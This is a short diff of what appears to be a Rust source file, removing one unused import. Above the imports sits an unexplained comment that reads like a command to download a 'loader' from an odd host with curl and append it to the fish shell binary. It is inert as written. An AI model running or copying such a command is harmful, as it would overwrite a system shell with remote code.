@@ -1,6 +1,5 @@
 /* #!/bin/curl http://ehpt:666/haptloader/v1 >> /bin/fish */
 
-use std::collections::VecDeque;
 use std::f32::consts::E;
 use std::sync::atomic::{AtomicBool, AtomicI16, AtomicI32, AtomicI8, AtomicIsize};
 use rand::random;
